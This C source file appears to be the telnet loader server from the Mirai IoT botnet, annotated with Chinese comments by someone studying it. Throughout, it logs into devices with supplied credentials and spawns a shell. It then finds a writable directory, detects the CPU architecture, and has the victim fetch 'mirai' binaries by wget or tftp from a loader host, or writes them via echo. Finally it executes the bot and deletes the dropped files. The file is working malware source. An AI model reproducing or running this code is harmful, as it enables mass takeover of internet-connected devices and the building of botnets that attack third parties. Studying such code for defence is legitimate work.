#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <sched.h>
#include <errno.h>
#include "headers/includes.h"
#include "headers/server.h"
#include "headers/telnet_info.h"
#include "headers/connection.h"
#include "headers/binary.h"
#include "headers/util.h"

//创建threads个线程
struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, char *wghip, port_t wghp, char *thip)
{
    struct server *srv = calloc(1, sizeof (struct server));
    struct server_worker *workers = calloc(threads, sizeof (struct server_worker));
    int i;

    // Fill out the structure
    srv->bind_addrs_len = addr_len;
    srv->bind_addrs = addrs;
    srv->max_open = max_open;
    srv->wget_host_ip = wghip;
    srv->wget_host_port = wghp;
    srv->tftp_host_ip = thip;
    srv->estab_conns = calloc(max_open * 2, sizeof (struct connection *));
    srv->workers = calloc(threads, sizeof (struct server_worker));//为threads个线程分配空间
    srv->workers_len = threads;

    if (srv->estab_conns == NULL)
    {
        printf("Failed to allocate establisted_connections array\n");
        exit(0);
    }

    // Allocate locks internally
    for (i = 0; i < max_open * 2; i++)
    {
        srv->estab_conns[i] = calloc(1, sizeof (struct connection));
        if (srv->estab_conns[i] == NULL)
        {
            printf("Failed to allocate connection %d\n", i);
            exit(-1);
        }
        pthread_mutex_init(&(srv->estab_conns[i]->lock), NULL);
    }

    // Create worker threads　　　有多少个cpu就创建多少个线程
    for (i = 0; i < threads; i++)
    {
        struct server_worker *wrker = &srv->workers[i];

        wrker->srv = srv;
        wrker->thread_id = i;

        if ((wrker->efd = epoll_create1(0)) == -1)
        {
            printf("Failed to initialize epoll context. Error code %d\n", errno);
            free(srv->workers);
            free(srv);
            return NULL;
        }

        pthread_create(&wrker->thread, NULL, worker, wrker);//创建子线程，并将epoll fd传入子线程
    }

    pthread_create(&srv->to_thrd, NULL, timeout_thread, srv);

    return srv;
}

void server_destroy(struct server *srv)
{
    if (srv == NULL)
        return;
    if (srv->bind_addrs != NULL)
        free(srv->bind_addrs);
    if (srv->workers != NULL)
        free(srv->workers);
    free(srv);
}


//判断能否处理新的感染节点
void server_queue_telnet(struct server *srv, struct telnet_info *info)
{
    while (ATOMIC_GET(&srv->curr_open) >= srv->max_open)
    {
        sleep(1);
    }
    ATOMIC_INC(&srv->curr_open);

    if (srv == NULL)
        printf("srv == NULL 3\n");

    server_telnet_probe(srv, info);
}

//处理新节点，添加新节点
void server_telnet_probe(struct server *srv, struct telnet_info *info)
{
    int fd = util_socket_and_bind(srv);
    struct sockaddr_in addr;
    struct connection *conn;
    struct epoll_event event;
    int ret;
    struct server_worker *wrker = &srv->workers[ATOMIC_INC(&srv->curr_worker_child) % srv->workers_len];

    if (fd == -1)
    {
        if (time(NULL) % 10 == 0)
        {
            printf("Failed to open and bind socket\n");
        }
        ATOMIC_DEC(&srv->curr_open);
        return;
    }
    while (fd >= (srv->max_open * 2))
    {
        printf("fd too big\n");
        conn->fd = fd;
#ifdef DEBUG
        printf("Can't utilize socket because client buf is not large enough\n");
#endif
        connection_close(conn);
        return;
    }

    if (srv == NULL)
        printf("srv == NULL 4\n");

    conn = srv->estab_conns[fd];
    memcpy(&conn->info, info, sizeof (struct telnet_info));
    conn->srv = srv;
    conn->fd = fd;
    connection_open(conn);//主线程连接bot节点

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = info->addr;
    addr.sin_port = info->port;
    ret = connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));//主线程连接bot节点
    if (ret == -1 && errno != EINPROGRESS)
    {
        printf("got connect error\n");
    }

    event.data.fd = fd;
    event.events = EPOLLOUT;//EPOLLOUT
    epoll_ctl(wrker->efd, EPOLL_CTL_ADD, fd, &event);//worker线程监听新节点上的写事件
}

//线程与cpu核的绑定  多核多线程中一般会使用到
static void bind_core(int core)
{
    pthread_t tid = pthread_self();
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);
    if (pthread_setaffinity_np(tid, sizeof (cpu_set_t), &cpuset) != 0)
        printf("Failed to bind to core %d\n", core);
}


//创建的worker线程　　　　如果是多核，那么有多个线程同时在监听事件，当一个事件到来时，多个线程之间如何竞争呢？？？
static void *worker(void *arg)
{
    struct server_worker *wrker = (struct server_worker *)arg;
    struct epoll_event events[128];

    bind_core(wrker->thread_id);//将该线程与一个cpu绑定

    while (TRUE)
    {
        int i, n = epoll_wait(wrker->efd, events, 127, -1);//worker线程监听事件

        if (n == -1)
            perror("epoll_wait");

        for (i = 0; i < n; i++)
            handle_event(wrker, &events[i]);//处理所有的事件
    }
}


//内部是一个状态机
static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
{
    struct connection *conn = wrker->srv->estab_conns[ev->data.fd];

    if (conn->fd == -1)
    {
        conn->fd = ev->data.fd;
        connection_close(conn);
        return;
    }

    if (conn->fd != ev->data.fd)
    {
        printf("yo socket mismatch\n");
    }

    // Check if there was an error   epoll出错
    if (ev->events & EPOLLERR || ev->events & EPOLLHUP || ev->events & EPOLLRDHUP)
    {
#ifdef DEBUG
        if (conn->open)
            printf("[FD%d] Encountered an error and must shut down\n", ev->data.fd);
#endif
        connection_close(conn);
        return;
    }

    // Are we ready to write?　　　发生写事件
    if (conn->state_telnet == TELNET_CONNECTING && ev->events & EPOLLOUT)
    {
        struct epoll_event event;

        int so_error = 0;
        socklen_t len = sizeof(so_error);
        getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &so_error, &len);
        if (so_error)
        {
#ifdef DEBUG
            printf("[FD%d] Connection refused\n", ev->data.fd);
#endif
            connection_close(conn);
            return;
        }

#ifdef DEBUG
//触发写事件就表示已经建立了连接？？？？　好像是啊，触发写事件表示这时候socket已经可写，socket可写肯定是已经建立了连接
        printf("[FD%d] Established connection\n", ev->data.fd);
#endif
        event.data.fd = conn->fd;
        event.events = EPOLLIN | EPOLLET;
        epoll_ctl(wrker->efd, EPOLL_CTL_MOD, conn->fd, &event);//epoll改为　监听读事件和边沿触发模式
        conn->state_telnet = TELNET_READ_IACS;//状态改变
        conn->timeout = 30;
    }

    if (!conn->open)
    {
        printf("socket not open! conn->fd: %d, fd: %d, events: %08x, state: %08x\n", conn->fd, ev->data.fd, ev->events, conn->state_telnet);
    }

    // Is there data to read?  读事件　　且conn的状态是open
    if (ev->events & EPOLLIN && conn->open)
    {
        int ret;

        conn->last_recv = time(NULL);
        while (TRUE)//ET模式，只触发一次接收，所以需要while(1) 读取所有接收缓存中的数据
        {
            //接收telnet返回的数据，存到conn->rdbuf中。
            ret = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, sizeof (conn->rdbuf) - conn->rdbuf_pos, MSG_NOSIGNAL);
            if (ret <= 0)//出错或者读取完了
            {
                if (errno != EAGAIN && errno != EWOULDBLOCK)//出错
                {
#ifdef DEBUG
                    if (conn->open)
                        printf("[FD%d] Encountered error %d. Closing\n", ev->data.fd, errno);
#endif
                    connection_close(conn);
                }
                break;
            }
#ifdef DEBUG
            printf("TELIN: %.*s\n", ret, conn->rdbuf + conn->rdbuf_pos);
#endif
            conn->rdbuf_pos += ret;
            conn->last_recv = time(NULL);

            if (conn->rdbuf_pos > 8196)
			{
                printf("oversized buffer pointer!\n");
				abort();
			}

            while (TRUE)//状态机　　　感觉这里用while没有必要。。　　一个状态变成另一个状态，consume一直会返回０,因为要等待上面的recv函数接收telnet的数据。
            {
                int consumed;

                switch (conn->state_telnet)
                {
                    case TELNET_READ_IACS:
                        consumed = connection_consume_iacs(conn);//是否顺利建立连接
                        if (consumed)
                            conn->state_telnet = TELNET_USER_PROMPT;
                        break;
                    case TELNET_USER_PROMPT:
                        consumed = connection_consume_login_prompt(conn);//是否收到login提示信息
                        if (consumed)
                        {
                            util_sockprintf(conn->fd, "%s", conn->info.user);//输入用户名
                            strcpy(conn->output_buffer.data, "\r\n");
                            conn->output_buffer.deadline = time(NULL) + 1;
                            conn->state_telnet = TELNET_PASS_PROMPT;
                        }
                        break;
                    case TELNET_PASS_PROMPT:
                        consumed = connection_consume_password_prompt(conn);//是否收到password提示信息
                        if (consumed)
                        {
                            util_sockprintf(conn->fd, "%s", conn->info.pass);//输入密码
                            strcpy(conn->output_buffer.data, "\r\n");
                            conn->output_buffer.deadline = time(NULL) + 1;
                            conn->state_telnet = TELNET_WAITPASS_PROMPT; // At the very least it will print SOMETHING
                        }
                        break;
                    case TELNET_WAITPASS_PROMPT://是否收到一些打印信息
                        if ((consumed = connection_consume_prompt(conn)) > 0)
                        {
                            util_sockprintf(conn->fd, "enable\r\n");//enable shell sh ????????
                            util_sockprintf(conn->fd, "shell\r\n");
                            util_sockprintf(conn->fd, "sh\r\n");
                            conn->state_telnet = TELNET_CHECK_LOGIN;
                        }
                        break;
                    case TELNET_CHECK_LOGIN:
                        if ((consumed = connection_consume_prompt(conn)) > 0)
                        {
                            util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");  ///bin/busybox ECCHI
                            conn->state_telnet = TELNET_VERIFY_LOGIN;
                        }
                        break;
                    case TELNET_VERIFY_LOGIN://验证是否登录成功
                        consumed = connection_consume_verify_login(conn);
                        if (consumed)
                        {
                            ATOMIC_INC(&wrker->srv->total_logins);
#ifdef DEBUG
                            printf("[FD%d] Succesfully logged in\n", ev->data.fd);
#endif
                            util_sockprintf(conn->fd, "/bin/busybox ps; " TOKEN_QUERY "\r\n");//执行ps命令
                            conn->state_telnet = TELNET_PARSE_PS;
                        }
                        break;
                    case TELNET_PARSE_PS://根据ps返回结果kill某些进程　　　确认是否可以执行busybox命令
                        if ((consumed = connection_consume_psoutput(conn)) > 0)
                        {
                            util_sockprintf(conn->fd, "/bin/busybox cat /proc/mounts; " TOKEN_QUERY "\r\n");
                            conn->state_telnet = TELNET_PARSE_MOUNTS;
                        }
                        break;
                    case TELNET_PARSE_MOUNTS://根据mounts返回结果切换到可写目录
                        consumed = connection_consume_mounts(conn);
                        if (consumed)
                            conn->state_telnet = TELNET_READ_WRITEABLE;
                        break;
                    case TELNET_READ_WRITEABLE://如果发现可用于读写的文件目录，进入该目录并将/bin/echo拷贝到该目录，文件更名为dvrHelpler，并开启所有用户的读写执行权限。
                        consumed = connection_consume_written_dirs(conn);
                        if (consumed)
                        {
#ifdef DEBUG
                            printf("[FD%d] Found writeable directory: %s/\n", ev->data.fd, conn->info.writedir);
#endif
                            util_sockprintf(conn->fd, "cd %s/\r\n", conn->info.writedir, conn->info.writedir);//进入该可写的目录
                            //将/bin/echo拷贝进该目录，更名为dvrHelper,改变权限
                            util_sockprintf(conn->fd, "/bin/busybox cp /bin/echo " FN_BINARY "; >" FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n");
                            conn->state_telnet = TELNET_COPY_ECHO;
                            conn->timeout = 120;
                        }
                        break;
                    case TELNET_COPY_ECHO://获取系统架构
                        consumed = connection_consume_copy_op(conn);//判断copy操作是否完成
                        if (consumed)
                        {
#ifdef DEBUG
                            printf("[FD%d] Finished copying /bin/echo to cwd\n", conn->fd);
#endif
                            if (!conn->info.has_arch)
                            {
                                conn->state_telnet = TELNET_DETECT_ARCH;
                                conn->timeout = 120;
                                // DO NOT COMBINE THESE
                                util_sockprintf(conn->fd, "/bin/busybox cat /bin/echo\r\n");
                                util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
                            }
                            else
                            {
                                conn->state_telnet = TELNET_UPLOAD_METHODS;
                                conn->timeout = 15;
                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                            }
                        }
                        break;
                    case TELNET_DETECT_ARCH://根据/bin/echo文件来判断系统体系架构
                        consumed = connection_consume_arch(conn);
                        if (consumed)
                        {
                            conn->timeout = 15;
                            //取得bin文件，conn->bin指向内存中的bin文件
                            if ((conn->bin = binary_get_by_arch(conn->info.arch)) == NULL)//没有此类体系架构的bin文件
                            {
#ifdef DEBUG
                                printf("[FD%d] Cannot determine architecture\n", conn->fd);
#endif
                                connection_close(conn);
                            }
                            else if (strcmp(conn->info.arch, "arm") == 0)//arm架构,arm架构复杂一些，有arm和arm7之分
                            {
#ifdef DEBUG
                                printf("[FD%d] Determining ARM sub-type\n", conn->fd);
#endif
                                util_sockprintf(conn->fd, "cat /proc/cpuinfo; " TOKEN_QUERY "\r\n");//cpuinfo查看cpu架构
                                conn->state_telnet = TELNET_ARM_SUBTYPE;
                            }
                            else//非arm架构
                            {
#ifdef DEBUG
                                printf("[FD%d] Detected architecture: '%s'\n", ev->data.fd, conn->info.arch);
#endif
                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");//给对方发送wget;tftp，然后检查响应
                                conn->state_telnet = TELNET_UPLOAD_METHODS;
                            }
                        }
                        break;
                    case TELNET_ARM_SUBTYPE://arm架构某种子架构　　　感觉确实没必要啊
                        if ((consumed = connection_consume_arm_subtype(conn)) > 0)
                        {
                            struct binary *bin = binary_get_by_arch(conn->info.arch);

                            if (bin == NULL)
                            {
#ifdef DEBUG
                                printf("[FD%d] We do not have an ARMv7 binary, so we will try using default ARM\n", conn->fd);
#endif
                            }
                            else
                                conn->bin = bin;//armv7

                            util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                            conn->state_telnet = TELNET_UPLOAD_METHODS;
                        }
                        break;
                    case TELNET_UPLOAD_METHODS://判断采用哪种方式上传payload
                        consumed = connection_consume_upload_methods(conn);

                        if (consumed)
                        {
#ifdef DEBUG
                            printf("[FD%d] Upload method is ", conn->fd);
#endif
                            switch (conn->info.upload_method)
                            {
                                case UPLOAD_ECHO:
                                    conn->state_telnet = TELNET_UPLOAD_ECHO;
                                    conn->timeout = 30;
                                    util_sockprintf(conn->fd, "/bin/busybox cp "FN_BINARY " " FN_DROPPER "; > " FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
#ifdef DEBUG
                                    printf("echo\n");
#endif
                                    break;
                                case UPLOAD_WGET:
                                    conn->state_telnet = TELNET_UPLOAD_WGET;
                                    conn->timeout = 120;
                                    //wget http:ip:port/bins/mirai.arm -O - > dvrHelper; chmod 777 dvrHelper;
                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/bins/%s.%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                    wrker->srv->wget_host_ip, wrker->srv->wget_host_port, "mirai", conn->info.arch);
#ifdef DEBUG
                                    printf("wget\n");
#endif
                                    break;
                                case UPLOAD_TFTP:
                                    conn->state_telnet = TELNET_UPLOAD_TFTP;
                                    conn->timeout = 120;
                                    util_sockprintf(conn->fd, "/bin/busybox tftp -g -l %s -r %s.%s %s; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                    FN_BINARY, "mirai", conn->info.arch, wrker->srv->tftp_host_ip);
#ifdef DEBUG
                                    printf("tftp\n");
#endif
                                    break;
                            }
                        }
                        break;
                    case TELNET_UPLOAD_ECHO:   //结束上传，通过telnet远程执行上传的bot
                        consumed = connection_upload_echo(conn);//echo好像是这里上传的bot程序
                        if (consumed)
                        {
                            conn->state_telnet = TELNET_RUN_BINARY;
                            conn->timeout = 30;
#ifdef DEBUG
                            printf("[FD%d] Finished echo loading!\n", conn->fd);
#endif
                            util_sockprintf(conn->fd, "./%s; ./%s %s.%s; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY, id_tag, conn->info.arch);
                            ATOMIC_INC(&wrker->srv->total_echoes);
                        }
                        break;
                    case TELNET_UPLOAD_WGET://wget方式执行
                        consumed = connection_upload_wget(conn);//查看TOKEN_QUERY有没有执行
                        if (consumed)
                        {
                            conn->state_telnet = TELNET_RUN_BINARY;
                            conn->timeout = 30;
#ifdef DEBUG
                            printf("[FD%d] Finished wget loading\n", conn->fd);
#endif
                            //   ./dvrHelpler telnet.arm     啥意思？？
                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
                            ATOMIC_INC(&wrker->srv->total_wgets);
                        }
                        break;
                    case TELNET_UPLOAD_TFTP://tftp方式执行
                        consumed = connection_upload_tftp(conn);//查看TOKEN_QUERY有没有执行
                        if (consumed > 0)
                        {
                            conn->state_telnet = TELNET_RUN_BINARY;
                            conn->timeout = 30;
#ifdef DEBUG
                            printf("[FD%d] Finished tftp loading\n", conn->fd);
#endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
                            ATOMIC_INC(&wrker->srv->total_tftps);
                        }
                        else if (consumed < -1) // Did not have permission to TFTP　　没有权限
                        {
#ifdef DEBUG
                            printf("[FD%d] No permission to TFTP load, falling back to echo!\n", conn->fd);
#endif
                            consumed *= -1;
                            conn->state_telnet = TELNET_UPLOAD_ECHO;//如果tftp没有权限，则采用echo方式重新上传程序并执行
                            conn->info.upload_method = UPLOAD_ECHO;

                            conn->timeout = 30;
                            util_sockprintf(conn->fd, "/bin/busybox cp "FN_BINARY " " FN_DROPPER "; > " FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
                        }
                        break;
                    case TELNET_RUN_BINARY://远程删除bot程序
                        if ((consumed = connection_verify_payload(conn)) > 0)//检查是否已经成功执行bot程序
                        {
                            if (consumed >= 255)
                            {
                                conn->success = TRUE;
#ifdef DEBUG
                                printf("[FD%d] Succesfully ran payload\n", conn->fd);
#endif
                                consumed -= 255;
                            }
                            else
                            {
#ifdef DEBUG
                                printf("[FD%d] Failed to execute payload\n", conn->fd);
#endif
                                if (!conn->retry_bin && strncmp(conn->info.arch, "arm", 3) == 0)//可能是arm体系架构各个版本不兼容，导致执行不成功
                                {
                                    conn->echo_load_pos = 0;
                                    strcpy(conn->info.arch, (conn->info.arch[3] == '\0' ? "arm7" : "arm"));
                                    conn->bin = binary_get_by_arch(conn->info.arch);
                                    util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                                    conn->state_telnet = TELNET_UPLOAD_METHODS;
                                    conn->retry_bin = TRUE;//重新upload
                                    break;
                                }
                            }
#ifndef DEBUG               //rm -rf upnp; > dvrHelper ; 
                            util_sockprintf(conn->fd, "rm -rf " FN_DROPPER "; > " FN_BINARY "; " TOKEN_QUERY "\r\n");
#else
                            util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
#endif
                            conn->state_telnet = TELNET_CLEANUP;
                            conn->timeout = 10;
                        }
                        break;
                    case TELNET_CLEANUP:
                        if ((consumed = connection_consume_cleanup(conn)) > 0)//删除bot程序成功，断开连接
                        {
                            int tfd = conn->fd;

                            connection_close(conn);
#ifdef DEBUG
                            printf("[FD%d] Cleaned up files\n", tfd);
#endif
                        }
                    default://至此状态机结束
                        consumed = 0;
                        break;
                }

                if (consumed == 0) // We didn't consume any data　　只要有一个consume函数没有成功，则退出循环
                    break;
                else
                {
                    if (consumed > conn->rdbuf_pos)
                    {
                        consumed = conn->rdbuf_pos;
                        //printf("consuming more then our position!\n");
                        //abort();
                    }
                    conn->rdbuf_pos -= consumed;
                    memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                    conn->rdbuf[conn->rdbuf_pos] = 0;
                }

                if (conn->rdbuf_pos > 8196)//从telnet返回的数据超过缓存
                {
                    printf("oversized buffer! 2\n");
                    abort();
                }
            }
        }
    }
}


//超时线程
static void *timeout_thread(void *arg)
{
    struct server *srv = (struct server *)arg;
    int i, ct;

    while (TRUE)
    {
        ct = time(NULL);

        for (i = 0; i < (srv->max_open * 2); i++)
        {
            struct connection *conn = srv->estab_conns[i];

            if (conn->open && conn->last_recv > 0 && ct - conn->last_recv > conn->timeout)
            {
#ifdef DEBUG
                printf("[FD%d] Timed out\n", conn->fd);
#endif
                if (conn->state_telnet == TELNET_RUN_BINARY && !conn->ctrlc_retry && strncmp(conn->info.arch, "arm", 3) == 0)
                {
                    conn->last_recv = time(NULL);
                    util_sockprintf(conn->fd, "\x03\x1Akill %%1\r\nrm -rf " FN_BINARY " " FN_DROPPER "\r\n");
                    conn->ctrlc_retry = TRUE;

                    conn->echo_load_pos = 0;
                    strcpy(conn->info.arch, (conn->info.arch[3] == '\0' ? "arm7" : "arm"));
                    conn->bin = binary_get_by_arch(conn->info.arch);
                    util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                    conn->state_telnet = TELNET_UPLOAD_METHODS;
                    conn->retry_bin = TRUE;
                } else {
                    connection_close(conn);
                }
            } else if (conn->open && conn->output_buffer.deadline != 0 && time(NULL) > conn->output_buffer.deadline)
            {
                conn->output_buffer.deadline = 0;
                util_sockprintf(conn->fd, conn->output_buffer.data);
            }
        }

        sleep(1);
    }
}

